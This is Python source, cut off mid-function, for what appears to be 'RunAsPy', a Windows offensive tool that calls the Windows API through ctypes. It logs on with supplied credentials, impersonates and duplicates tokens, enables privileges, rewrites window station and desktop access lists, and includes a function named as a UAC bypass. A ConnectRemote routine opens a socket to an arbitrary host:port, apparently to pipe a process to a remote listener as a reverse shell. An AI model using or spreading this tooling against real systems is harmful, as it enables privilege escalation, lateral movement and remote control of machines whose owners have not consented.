import os
import ctypes
import ctypes.wintypes
import socket
import struct
import logging
from .windefs import *


def convertAttributeToString(attribute):
    if attribute == 0:
        return "Disabled"
    if attribute == 1:
        return "Enabled Default"
    if attribute == 2:
        return "Enabled"
    if attribute == 3:
        return "Enabled|Enable Default"
    return "Error"

class runas_logging_formatter(logging.Formatter):
    grey = "\x1b[38;20m"
    cyan = "\x1b[36;20m"
    yellow = "\x1b[33;20m"
    red = "\x1b[31;20m"
    bold_red = "\x1b[31;1m"
    reset = "\x1b[0m"
    log_format = "%(levelname)s: %(message)s"

    logger_formats = {
        logging.DEBUG: grey + "[*] " + log_format + reset,
        logging.INFO: cyan + "[+] " + log_format + reset,
        logging.WARNING: yellow + "[!] " + log_format + reset,
        logging.ERROR: red + "[-] " + log_format + reset,
        logging.CRITICAL: bold_red + log_format + reset
    }

    def format(self, record):
        log_fmt = self.logger_formats.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)

class RunAsPyException(Exception):

    def __init__(self, value):
        error = ctypes.GetLastError()
        err_str = ctypes.WinError(error).strerror
        self.value = f"{ value } failed with error { error }: { err_str }"
    
    def __str__(self):
        return(repr(self.value))


class AccessToken(object):
    SECURITY_MANDATORY_UNTRUSTED_RID = 0
    SECURITY_MANDATORY_LOW_RID = 0x1000
    SECURITY_MANDATORY_MEDIUM_RID = 0x2000
    SECURITY_MANDATORY_HIGH_RID = 0x3000
    SECURITY_MANDATORY_SYSTEM_RID = 0x4000
    SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x5000
    SE_PRIVILEGE_ENABLED = 0x00000002
    MANDATORY_LABEL_AUTHORITY = bytes([0,0,0,0,0,16])
    STANDARD_RIGHTS_REQUIRED = 0x000F0000
    STANDARD_RIGHTS_READ = 0x00020000
    TOKEN_ASSIGN_PRIMARY = 0x0001
    TOKEN_DUPLICATE = 0x0002
    TOKEN_IMPERSONATE = 0x0004
    TOKEN_QUERY = 0x0008
    TOKEN_QUERY_SOURCE = 0x0010
    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_ADJUST_GROUPS = 0x0040
    TOKEN_ADJUST_DEFAULT = 0x0080
    TOKEN_ADJUST_SESSIONID = 0x0100
    TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
    TOKEN_ALL_ACCESS = ( STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE
        | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES |
        TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID )
    MAXIMUM_ALLOWED = 0x02000000
    MANDATORY_LABEL_AUTHORITY = (ctypes.c_byte * 6)(0,0,0,0,0,16)

    def IsFilteredUACToken(hToken):
        tokenIsFiltered = False
        TokenInfLength = ctypes.wintypes.DWORD(0)
        if AccessToken.GetTokenIntegrityLevel(hToken) >= IntegrityLevel.High:
            return False
        GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, ctypes.c_void_p(0), TokenInfLength, ctypes.byref(TokenInfLength))
        tokenElevationPtr = (ctypes.c_byte * TokenInfLength.value)()
        if not GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, ctypes.byref(tokenElevationPtr), TokenInfLength, ctypes.byref(TokenInfLength)):
            raise RunAsPyException(f"GetTokenInformation TokenElevation")
        tokenElevation = ctypes.cast(ctypes.pointer(tokenElevationPtr), ctypes.POINTER(TOKEN_ELEVATION))
        if tokenElevation.contents.TokenIsElevated > 0:
            tokenIsFiltered = False
        else:
            TokenInfLength = ctypes.wintypes.DWORD(0)
            GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevationType, ctypes.c_void_p(0), TokenInfLength, ctypes.byref(TokenInfLength))
            tokenElevationTypePtr = (ctypes.c_byte * TokenInfLength.value)()
            if not GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevationType, ctypes.byref(tokenElevationTypePtr), TokenInfLength, ctypes.byref(TokenInfLength)):
                raise RunAsPyException("GetTokenInformation TokenElevationType")
            tokenElevationType = ctypes.cast(ctypes.pointer(tokenElevationTypePtr), ctypes.POINTER(TOKEN_ELEVATION_TYPE))
            if tokenElevationType.contents.TokenElevationType == 3:
                tokenIsFiltered = True
        return tokenIsFiltered

    def GetTokenPrivileges(tHandle):
        privileges = []
        TokenInfLength = ctypes.wintypes.DWORD(0)
        result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, ctypes.c_void_p(0), TokenInfLength, ctypes.byref(TokenInfLength))
        TokenInformation = (ctypes.c_ubyte * TokenInfLength.value)()
        result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, ctypes.byref(TokenInformation), TokenInfLength, ctypes.byref(TokenInfLength))
        if not result:
            raise RunAsPyException(f"GetTokenInformation")
        TokenPrivileges = ctypes.cast(ctypes.pointer(TokenInformation), ctypes.POINTER(TOKEN_PRIVILEGES))
        for tokenPriv in range(0, TokenPrivileges.contents.PrivilegeCount):
            luid = TokenPrivileges.contents.Privileges[tokenPriv].Luid
            luidNameLen = ctypes.wintypes.DWORD(0)
            LookupPrivilegeName(ctypes.c_void_p(0), ctypes.byref(luid), ctypes.c_void_p(0), ctypes.byref(luidNameLen))
            sb = (ctypes.c_char * luidNameLen.value)()
            result = LookupPrivilegeName(ctypes.c_void_p(0), ctypes.byref(luid), sb, ctypes.byref(luidNameLen))
            if not result:
                raise RunAsPyException("LookupPrivilegeName")
            privilegeStatus = [
                bytes(sb).decode()[:-1],
                convertAttributeToString(TokenPrivileges.contents.Privileges[tokenPriv].Attributes)
            ]
            privileges.append(privilegeStatus)
        return privileges
        
    def EnablePrivilege(privilege, token):
        sebLuid = LUID()
        tokenp = TOKEN_PRIVILEGES_2()
        tokenp.PrivilegeCount = 1
        LookupPrivilegeValue(ctypes.c_void_p(0), ctypes.wintypes.LPCSTR(privilege.encode()), ctypes.byref(sebLuid))
        tokenp.Luid = sebLuid
        tokenp.Attributes = AccessToken.SE_PRIVILEGE_ENABLED
        if not AdjustTokenPrivileges(token, ctypes.c_bool(False), ctypes.byref(tokenp), ctypes.wintypes.DWORD(0), ctypes.c_void_p(0), ctypes.c_void_p(0)):
            raise RunAsPyException(f"AdjustTokenPrivileges on privilege { privilege }")
        logging.info(f"AdjustTokenPrivileges on privilege { privilege } succeeded")

    def EnableAllPrivileges(token):
        for privilege in privileges:
            AccessToken.EnablePrivilege(privilege, token)

    def GetTokenIntegrityLevel(hToken):
        illevel = IntegrityLevel.Unknown
        cb = ctypes.wintypes.DWORD(0)
        GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, ctypes.c_void_p(None), ctypes.wintypes.DWORD(0), ctypes.byref(cb))
        pb = (ctypes.c_char * cb.value)()
        if GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, ctypes.byref(pb), cb, ctypes.byref(cb)):
            pSid = ctypes.c_void_p.from_address(ctypes.addressof(pb))
            dwIntegrityLevel = GetSidSubAuthority(pSid, ctypes.wintypes.DWORD(GetSidSubAuthorityCount(pSid).contents.value - 1))
            if dwIntegrityLevel.contents.value == AccessToken.SECURITY_MANDATORY_LOW_RID:
                return IntegrityLevel.Low
            elif dwIntegrityLevel.contents.value >= AccessToken.SECURITY_MANDATORY_MEDIUM_RID and dwIntegrityLevel.contents.value < AccessToken.SECURITY_MANDATORY_HIGH_RID:
                return IntegrityLevel.Medium
            elif dwIntegrityLevel.contents.value >= AccessToken.SECURITY_MANDATORY_HIGH_RID:
                return IntegrityLevel.High
            elif dwIntegrityLevel.contents.value >= AccessToken.SECURITY_MANDATORY_SYSTEM_RID:
                return IntegrityLevel.System
            return IntegrityLevel.Unknown
        return illevel

    def SetTokenIntegrityLevel(hToken, integrity):
        ret = False
        pSID = ctypes.c_void_p(0)
        tokenLabel = TOKEN_MANDATORY_LABEL()
        authoritySidStruct = SID_IDENTIFIER_AUTHORITY()
        authoritySidStruct.Value = AccessToken.MANDATORY_LABEL_AUTHORITY
        pLabelAuthority = (ctypes.c_ubyte * ctypes.sizeof(authoritySidStruct))()
        ctypes.memmove(pLabelAuthority, ctypes.byref(authoritySidStruct), ctypes.sizeof(pLabelAuthority))
        result = AllocateAndInitializeSid(
            ctypes.byref(pLabelAuthority), 
            ctypes.c_byte(1), 
            ctypes.wintypes.DWORD(integrity), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.wintypes.DWORD(0), 
            ctypes.byref(pSID)
        )
        tokenLabel.Label.Sid = pSID
        tokenLabel.Label.Attributes = TokenGroupAttributes.SE_GROUP_INTEGRITY
        labelSize = ctypes.sizeof(tokenLabel)
        pLabel = (ctypes.c_ubyte * labelSize)()
        ctypes.memmove(pLabel, ctypes.byref(tokenLabel), ctypes.sizeof(pLabel))
        result = SetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, ctypes.byref(pLabel), ctypes.wintypes.DWORD(labelSize))
        if not result:
            raise RunAsPyException(f"[!] Failed to set the token's Integrity Level ({integrity})")
        else:
            ret = True
        return ret


def CreateAnonymousPipeEveryoneAccess(hReadPipe, hWritePipe):
    sa = SECURITY_ATTRIBUTES()
    sa.nLength = ctypes.sizeof(sa)
    sa.lpSecurityDescriptor = ctypes.c_void_p(0)
    sa.bInheritHandle = True
    if CreatePipe(ctypes.byref(hReadPipe), ctypes.byref(hWritePipe), ctypes.byref(sa), ctypes.wintypes.DWORD(BUFFER_SIZE_PIPE)):
        return True
    return False

def ParseCommonProcessInCommandline(commandline):
    if (commandline[0].lower() == "cmd" or commandline[0].lower() == "cmd.exe"):
        commandline[0] = os.environ['COMSPEC']
    elif (commandline[0].lower() == "powershell" or commandline[0].lower() == "powershell.exe"):
        commandline[0] = f"{os.environ['WINDIR']}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    return " ".join(commandline)

def CheckAvailableUserLogonType(username, password, domainName, logonType, logonProvider):
    hTokenCheck1 = ctypes.wintypes.HANDLE(0)
    if not LogonUser(username, domainName, password, logonType, logonProvider.value, ctypes.byref(hTokenCheck1)):
        if ctypes.GetLastError() == ERROR_LOGON_TYPE_NOT_GRANTED:
            availableLogonType = 0
            for logonTypeTry in [LOGON32_LOGON_SERVICE, LOGON32_LOGON_BATCH, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_LOGON_NETWORK, LOGON32_LOGON_INTERACTIVE]:
                hTokenCheck2 = ctypes.c_void_p(0)
                if LogonUser(username, domainName, password, logonTypeTry, logonProvider, hTokenCheck2):
                    availableLogonType = logonTypeTry
                    if AccessToken.GetTokenIntegrityLevel(hTokenCheck2) > AccessToken.IntegrityLevel.Medium:
                        availableLogonType = logonTypeTry
                        CloseHandle(hTokenCheck2)
                        break
                if hTokenCheck2.value != 0:
                    CloseHandle(hTokenCheck2)
            if availableLogonType != 0:
                raise RunAsPyException(f"Selected logon type '{ logonType }' is not granted to the user '{ username }'. Use available logon type '{ availableLogonType }'.")
            else:
                raise RunAsPyException(f"LogonUser")
        raise RunAsPyException(f"LogonUser")
    if hTokenCheck1.value != 0:
        CloseHandle(hTokenCheck1)

def GetProcessFunction(createProcessFunction):
    if createProcessFunction == 0:
        return "CreateProcessAsUserW()"
    elif createProcessFunction == 1:
        return "CreateProcessWithTokenW()"
    else:
        return "CreateProcessWithLogonW()"

def GetUserSid(domain, username):
    err = 0
    Sid = ctypes.c_byte()
    cbSid = ctypes.wintypes.DWORD(0)
    referencedDomainName = ctypes.c_void_p(None)
    cchReferencedDomainName = ctypes.wintypes.DWORD(0)
    if domain and domain != b".":
        fqan = domain + b"\\" + username
    else:
        fqan = username
    fqan_buffer = ctypes.create_string_buffer(fqan, len(fqan) + 1)
    if not LookupAccountName(ctypes.c_void_p(None), ctypes.byref(fqan_buffer), ctypes.byref(Sid), ctypes.byref(cbSid), referencedDomainName, ctypes.byref(cchReferencedDomainName), ctypes.byref(SID_NAME_USE.SidTypeUser)):
        if ctypes.GetLastError() in [ERROR_INVALID_FLAGS, ERROR_INSUFFICIENT_BUFFER]:
            Sid = (ctypes.c_byte * cbSid.value)()
            referencedDomainName = (ctypes.c_byte * cchReferencedDomainName.value)()
            if not LookupAccountName(ctypes.c_void_p(None), ctypes.byref(fqan_buffer), ctypes.byref(Sid), ctypes.byref(cbSid), ctypes.byref(referencedDomainName), ctypes.byref(cchReferencedDomainName), ctypes.byref(SID_NAME_USE.SidTypeUser)):
                err = ctypes.GetLastError()
    else:
        raise RunAsPyException(f"The username { fqan } has not been found. LookupAccountName")
    if err != 0:
        raise RunAsPyException(f"The username { fqan } has not been found. LookupAccountName")
    return Sid

def DefaultCreateProcessFunction():
    currentTokenHandle = ctypes.wintypes.HANDLE(0)
    SeAssignPrimaryTokenPrivilegeAssigned = False
    SeImpersonatePrivilegeAssigned = False
    if not OpenProcessToken(ctypes.wintypes.HANDLE(-1), ctypes.wintypes.DWORD(AccessToken.TOKEN_QUERY), ctypes.byref(currentTokenHandle)):
        raise RunAsPyException("Failed to obtain token")
    privs = AccessToken.GetTokenPrivileges(currentTokenHandle)
    for priv in privs:
        if priv[0] == "SeAssignPrimaryTokenPrivilege" and AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= IntegrityLevel.Medium:
            SeAssignPrimaryTokenPrivilegeAssigned = True
        elif priv[0] == "SeImpersonatePrivilege" and AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= IntegrityLevel.High:
            SeImpersonatePrivilegeAssigned = True
    if SeAssignPrimaryTokenPrivilegeAssigned:
        createProcessFunction = 0
    elif SeImpersonatePrivilegeAssigned:
        createProcessFunction = 1
    else:
        createProcessFunction = 2
    return createProcessFunction

class WindowStationDACL(object):
    def __init__(self):
        self.hWinsta = ctypes.c_void_p(0)
        self.hDesktop = ctypes.c_void_p(0)
        self.userSid = ctypes.c_void_p(0)

    def AddAllowedAceToDACL(self, pDacl, mask, aceFlags, aceSize):
        offset = ctypes.sizeof(ACCESS_ALLOWED_ACE) - ctypes.sizeof(ctypes.c_uint)
        AceHeader = ACE_HEADER()
        AceHeader.AceType = ACCESS_ALLOWED_ACE_TYPE
        AceHeader.AceFlags = aceFlags
        AceHeader.AceSize = aceSize
        pNewAcePtr = (ctypes.c_ubyte * aceSize)()
        pNewAceStruct = ACCESS_ALLOWED_ACE()
        pNewAceStruct.Header = AceHeader
        pNewAceStruct.Mask = mask
        sidStartPtr = ctypes.addressof(pNewAcePtr) + offset
        ctypes.memmove(pNewAcePtr, ctypes.byref(pNewAceStruct), ctypes.sizeof(pNewAceStruct))
        if not CopySid(ctypes.wintypes.DWORD(GetLengthSid(self.userSid)), ctypes.c_void_p(sidStartPtr), ctypes.byref(self.userSid)):
            raise RunAsPyException("CopySid")
        if not AddAce(ctypes.byref(pDacl), ctypes.wintypes.DWORD(ACL_REVISION), ctypes.wintypes.DWORD(MAXDWORD), ctypes.byref(pNewAcePtr), ctypes.wintypes.DWORD(aceSize)):
            raise RunAsPyException("AddAce")

    def AddAce(self, target):
        if target not in self.__dict__:
            raise RunAsPyException(f"{target} not an attribute of WinStationDACL object")
        pSd = ctypes.c_void_p(0)
        pDacl = ctypes.c_void_p(0)
        cbSd = ctypes.wintypes.DWORD(0)
        fDaclExist = ctypes.c_bool(False)
        fDaclPresent = ctypes.c_bool(False)
        aclSizeInfo = ACL_SIZE_INFORMATION()
        si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION
        if not GetUserObjectSecurity(ctypes.wintypes.HANDLE(self.__dict__[target]), ctypes.byref(si), ctypes.byref(pSd), ctypes.wintypes.DWORD(0), ctypes.byref(cbSd)):
            if ctypes.GetLastError() != ERROR_INSUFFICIENT_BUFFER:
                raise RunAsPyException(f"GetUserObjectSecurity 1 size")
        pSd = (ctypes.c_ubyte * cbSd.value)()
        if not GetUserObjectSecurity(ctypes.wintypes.HANDLE(self.__dict__[target]), ctypes.byref(si), ctypes.byref(pSd), cbSd, ctypes.byref(cbSd)):
            raise RunAsPyException(f"GetUserObjectSecurity 2")
        if not GetSecurityDescriptorDacl(ctypes.byref(pSd), ctypes.byref(fDaclPresent), ctypes.byref(pDacl), ctypes.byref(fDaclExist)):
            raise RunAsPyException(f"GetSecurityDescriptorDacl")
        if not pDacl:
            cbDacl = 0
        else:
            if not GetAclInformation(pDacl, ctypes.byref(aclSizeInfo), ctypes.wintypes.DWORD(ctypes.sizeof(aclSizeInfo)), ACL_INFORMATION_CLASS.AclSizeInformation):
                raise RunAsPyException(f"GetAclInformation")
            cbDacl = aclSizeInfo.AclBytesInUse
        pNewSd = (ctypes.c_byte * cbSd.value )()
        if not InitializeSecurityDescriptor(ctypes.byref(pNewSd), ctypes.wintypes.DWORD(SECURITY_DESCRIPTOR_REVISION)):
            raise RunAsPyException(f"InitializeSecurityDescriptor")
        cbNewAce = ctypes.sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(self.userSid) - ctypes.sizeof(ctypes.c_uint)
        if not cbDacl:
            cbNewDacl = 8 + ((cbNewAce*2) if target == "hWinsta" else cbNewAce)
        else:
            cbNewDacl = cbDacl + ((cbNewAce*2) if target == "hWinsta" else cbNewAce)
        pNewDacl = (ctypes.c_byte * cbNewDacl)()
        if not InitializeAcl(ctypes.byref(pNewDacl), ctypes.wintypes.DWORD(cbNewDacl), ctypes.wintypes.DWORD(ACL_REVISION)):
            raise RunAsPyException(f"InitializeAcl")
        if fDaclPresent:
            for dwIndex in range(0, aclSizeInfo.AceCount):
                pTempAce = ctypes.c_void_p(0)
                if not GetAce(pDacl, ctypes.wintypes.DWORD(dwIndex), ctypes.byref(pTempAce)):
                    raise RunAsPyException(f"GetAce")
                pTempAceStruct = ctypes.cast(pTempAce, ctypes.POINTER(ACE_HEADER))
                if not AddAce(ctypes.byref(pNewDacl), ctypes.wintypes.DWORD(ACL_REVISION), ctypes.wintypes.DWORD(MAXDWORD), pTempAce, ctypes.wintypes.DWORD(pTempAceStruct.contents.AceSize)):
                    raise RunAsPyException("AddAce")
        if target == "hWinsta":
            self.AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.GENERIC_ACCESS, (CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE | OBJECT_INHERIT_ACE), cbNewAce)
            self.AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.WINSTA_ALL, NO_PROPAGATE_INHERIT_ACE, cbNewAce)
        elif target == "hDesktop":
            if not AddAccessAllowedAce(ctypes.byref(pNewDacl), ctypes.wintypes.DWORD(ACL_REVISION), ctypes.wintypes.DWORD(ACCESS_MASK.DESKTOP_ALL), self.userSid):
                raise RunAsPyException("AddAccessAllowedAce")
        if not SetSecurityDescriptorDacl(ctypes.byref(pNewSd), ctypes.c_bool(True), ctypes.byref(pNewDacl), ctypes.c_bool(False)):
            raise RunAsPyException("SetSecurityDescriptorDacl")
        if not SetUserObjectSecurity(ctypes.wintypes.HANDLE(self.__dict__[target]), ctypes.byref(si), ctypes.byref(pNewSd)):
            raise RunAsPyException("SetUserObjectSecurity")

    def AddAclToActiveWindowStation(self, domain, username, logonType):
        desktop = ctypes.create_string_buffer(b"Default", 8)
        lengthNeeded = ctypes.wintypes.DWORD(0)
        hWinstaSave = GetProcessWindowStation()
        stationNameBytes = (ctypes.c_byte * 256)()
        if not hWinstaSave:
            raise RunAsPyException(f"GetProcessWindowStation")
        if not GetUserObjectInformation(ctypes.wintypes.HANDLE(hWinstaSave), ctypes.c_int(UOI_NAME), ctypes.byref(stationNameBytes), ctypes.wintypes.DWORD(256), ctypes.byref(lengthNeeded)):
            raise RunAsPyException(f"GetUserObjectInformation")
        stationName = bytes(stationNameBytes)[:lengthNeeded.value - 1]
        if logonType != 9:
            self.hWinsta = OpenWindowStation(stationName, ctypes.c_bool(False), (READ_CONTROL | WRITE_DAC))
            if not self.hWinsta:
                raise RunAsPyException("OpenWindowStation")
            if not SetProcessWindowStation(ctypes.wintypes.HANDLE(self.hWinsta)):
                raise RunAsPyException("SetProcessWindowStation hWinsta")
            self.hDesktop = OpenDesktop(ctypes.byref(desktop), ctypes.wintypes.DWORD(0), ctypes.c_bool(False), ctypes.wintypes.DWORD(READ_CONTROL | WRITE_DAC | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS))
            if not SetProcessWindowStation(ctypes.wintypes.HANDLE(hWinstaSave)):
                raise RunAsPyException("SetProcessWindowStation hWinstaSave")
            if not self.hWinsta:
                raise RunAsPyException("OpenDesktop")
            self.userSid = GetUserSid(domain, username)
            self.AddAce('hWinsta')
            self.AddAce('hDesktop')
        return stationName + b"\\Default"


class RunAsPy():
    def __init__(self):
        self.hOutputRead = ctypes.c_void_p()
        self.hOutputWrite = ctypes.c_void_p()
        self.hErrorWrite = ctypes.c_void_p()
        self.socket = ctypes.c_void_p()
        self.stationDaclObj = None
        self.startupInfo = STARTUPINFO()
        self.hTokenPreviousImpersonatingThread = ctypes.c_void_p()
        self.logonTypeNotFiltered = 0

    def ImpersonateLoggedOnUserWithProperIL(self, hToken):
        TokenImpersonation = 2
        hTokenDuplicateLocal = ctypes.c_void_p(0)
        pHandle = ctypes.wintypes.HANDLE(0)
        current_thread = GetCurrentThread()
        if not OpenThreadToken(ctypes.wintypes.HANDLE(current_thread), ctypes.wintypes.DWORD(AccessToken.TOKEN_ALL_ACCESS), ctypes.c_bool(False), ctypes.byref(pHandle)):
            error = ctypes.GetLastError()
            if error != ERROR_NO_TOKEN:
                raise RunAsPyException(f"Failed to obtain token: { error }")
        else:
            self.hTokenPreviousImpersonatingThread = pHandle
        if not DuplicateTokenEx(hToken, ctypes.wintypes.DWORD(AccessToken.TOKEN_ALL_ACCESS), ctypes.c_void_p(0), SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, ctypes.c_int(TokenImpersonation), ctypes.byref(hTokenDuplicateLocal)):
            raise RunAsPyException(f"DuplicateTokenEx")
        pToken = ctypes.wintypes.HANDLE(0)
        if not OpenProcessToken(ctypes.wintypes.HANDLE(-1), ctypes.wintypes.DWORD(AccessToken.TOKEN_ALL_ACCESS), ctypes.byref(pToken)):
            raise RunAsPyException("Failed to obtain token")
        if AccessToken.GetTokenIntegrityLevel(pToken) < AccessToken.GetTokenIntegrityLevel(hTokenDuplicateLocal):
            AccessToken.SetTokenIntegrityLevel(hTokenDuplicateLocal, AccessToken.GetTokenIntegrityLevel(pToken))
        ImpersonateLoggedOnUser(hTokenDuplicateLocal)
        return hTokenDuplicateLocal

    def IsLimitedUserLogon(self, hToken, username, domainName, password):
        isLimitedUserLogon = False
        isTokenUACFiltered = AccessToken.IsFilteredUACToken(hToken)
        hTokenNetwork = ctypes.c_void_p(0)
        hTokenService = ctypes.c_void_p(0)
        hTokenBatch = ctypes.c_void_p(0)
        if isTokenUACFiltered:
            self.logonTypeNotFiltered = LOGON32_LOGON_NETWORK_CLEARTEXT
            isLimitedUserLogon = True
        else:
            userTokenIL = AccessToken.GetTokenIntegrityLevel(hToken)
            if LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_PROVIDER_DEFAULT, ctypes.byref(hTokenNetwork)) and userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenNetwork.value):
                isLimitedUserLogon = True
                self.logonTypeNotFiltered = LOGON32_LOGON_NETWORK_CLEARTEXT.value
            elif not isLimitedUserLogon and LogonUser(username, domainName, password, LOGON32_LOGON_SERVICE, LOGON32_PROVIDER_DEFAULT, ctypes.byref(hTokenNetwork)) and userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenService):
                isLimitedUserLogon = True
                self.logonTypeNotFiltered = LOGON32_LOGON_SERVICE
            elif not isLimitedUserLogon and LogonUser(username, domainName, password, LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, ctypes.byref(hTokenBatch)) and userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenBatch):
                isLimitedUserLogon = True
                self.logonTypeNotFiltered = LOGON32_LOGON_BATCH
            if hTokenNetwork.value:
                CloseHandle(hTokenNetwork)
            if hTokenService.value:
                CloseHandle(hTokenService)
            if hTokenBatch.value:
                CloseHandle(hTokenBatch)
        return isLimitedUserLogon

    def ConnectRemote(self, remote):
        host, port = remote.split(":")
        try:
            port = int(port)
        except:
            raise RunAsPyException(f"Specified port is invalid: { port }")
        data = WSADATA()
        if WSAStartup(2 << 8 | 2, ctypes.byref(data)):
            raise RunAsPyException(f"WSAStartup failed with error code: { ctypes.GetLastError() }")
        sock = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, ctypes.c_void_p(0), ctypes.wintypes.DWORD(0), ctypes.wintypes.DWORD(0))
        if sock == 0xffff:
            raise RunAsPyException(f"Failed to create socket: { ctypes.GetLastError() }")
        sockinfo = SOCKADDR_IN()
        sockinfo.sin_family = 2
        sockinfo.sin_addr = struct.unpack("<L", socket.inet_aton(host))[0]
        sockinfo.sin_port = socket.htons(port)
        if connect(ctypes.wintypes.HANDLE(sock), ctypes.byref(sockinfo), ctypes.c_int(ctypes.sizeof(sockinfo))):
            raise RunAsPyException(f"WSAConnect failed with error code: { ctypes.GetLastError() }")
        return sock

    def IsUserProfileCreated(self, username, password, domainName, logonType):
        result = False
        hToken = ctypes.c_void_p(0)
        logonProvider = LOGON32_PROVIDER_DEFAULT
        if logonType == LOGON32_LOGON_NEW_CREDENTIALS:
            logonProvider = LOGON32_PROVIDER_WINNT50
        result = LogonUser(username, domainName, password, ctypes.wintypes.DWORD(logonType), logonProvider, ctypes.byref(hToken))
        if not result:
            raise RunAsPyException("LogonUser")
        self.ImpersonateLoggedOnUserWithProperIL(hToken)
        try:
            dwSize = ctypes.wintypes.DWORD(0)
            GetUserProfileDirectory(hToken, ctypes.wintypes.LPSTR(b""), dwSize)
            profileDir = ctypes.wintypes.LPSTR(b" " * dwSize.value)
            GetUserProfileDirectory(hToken, profileDir, dwSize)
        except:
            result = False
        return result

    def CreateProcessWithLogonWUacBypass(self, logonType, logonFlags, username, domainName, password, processPath, commandLine, processInfo):
        result = False
        hToken = ctypes.c_void_p(0)
        pToken = ctypes.wintypes.HANDLE(0)
        hCurrentProcess = ctypes.wintypes.HANDLE(GetCurrentProcess())
        if not LogonUser(username, domainName, password, ctypes.wintypes.DWORD(logonType), LOGON32_PROVIDER_DEFAULT, ctypes.byref(hToken)):
            raise RunAsPyException(f"CreateProcessWithLogonWUacBypass: LogonUser")
        if not OpenProcessToken(ctypes.wintypes.HANDLE(-1), ctypes.wintypes.DWORD(AccessToken.MAXIMUM_ALLOWED), ctypes.byref(pToken)):
            raise RunAsPyException("Failed to obtain token")
        AccessToken.SetTokenIntegrityLevel(hToken, AccessToken.GetTokenIntegrityLevel(pToken))
        SetSecurityInfo(ctypes.wintypes.HANDLE(-1), SE_OBJECT_TYPE.SE_KERNEL_OBJECT, SECURITY_INFORMATION.DACL_SECURITY_INFORMATION, ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0))
        if not DuplicateHandle(hCurrentProcess, hToken, hCurrentProcess, ctypes.byref(hCurrentProcess), ctypes.wintypes.DWORD(0), True, DUPLICATE_SAME_ACCESS):
            raise RunAsPyException(f"Failed to duplicate handle: { hCurrentProcess } ")
        result = CreateProcessWithLogonW(
            username.decode(),
            domainName.decode(),
            password.decode(),
            logonFlags.value | LOGON_NETCREDENTIALS_ONLY,
            processPath.decode() if processPath else processPath,
            commandLine,
            CREATE_NO_WINDOW,
            None,
            None,
            ctypes.byref(self.startupInfo),
            ctypes.byref(processInfo)
        )
        return result

    def ReadOutputFromPipe(self, hReadPipe):
        dwBytesRead = ctypes.wintypes.DWORD(0)
        buffer = (ctypes.c_byte * BUFFER_SIZE_PIPE)()
        output = ""
        hResult = False
        while not hResult:
            hResult = ReadFile(hReadPipe, ctypes.byref(buffer), ctypes.wintypes.DWORD(BUFFER_SIZE_PIPE), ctypes.byref(dwBytesRead), ctypes.c_void_p(0))
            if not hResult and ctypes.GetLastError() != ERROR_MORE_DATA:
                break
            output += bytes(buffer[:dwBytesRead.value]).decode()
        if not hResult:
            logging.info("No output received from the process.")
        return output

    def RevertToSelfCustom(self):
        RevertToSelf()
        if self.hTokenPreviousImpersonatingThread:
            ImpersonateLoggedOnUser(self.hTokenPreviousImpersonatingThread)

    def GetUserEnvironmentBlock(self, hToken, username, forceUserProfileCreation, userProfileExists):
        result = False
        profileInfo = PROFILEINFO()
        lpEnvironment = ctypes.c_void_p(0)
        hTokenDuplicate = ctypes.c_void_p(0)
        if forceUserProfileCreation or userProfileExists:
            profileInfo.dwSize = ctypes.sizeof(profileInfo)
            profileInfo.lpUserName = username
            result = LoadUserProfile(hToken, ctypes.byref(profileInfo))
            if not result and ctypes.GetLastError() == 1314:
                logging.warning("LoadUserProfile failed due to insufficient permissions")
        hTokenDuplicate = self.ImpersonateLoggedOnUserWithProperIL(hToken)
        try:
            CreateEnvironmentBlock(ctypes.byref(lpEnvironment), hToken, ctypes.c_bool(False))
        except:
            result = False
        self.RevertToSelfCustom()
        CloseHandle(hTokenDuplicate)
        if result and (forceUserProfileCreation or userProfileExists):
            UnloadUserProfile(hToken, profileInfo.hProfile)
    
    def RunasRemoteImpersonation(self, username, domainName, password, logonType, logonProvider, commandLine, processInfo):
        TokenImpersonation = 2
        hToken = ctypes.c_void_p(0)
        lpEnvironment = ctypes.c_void_p(0)
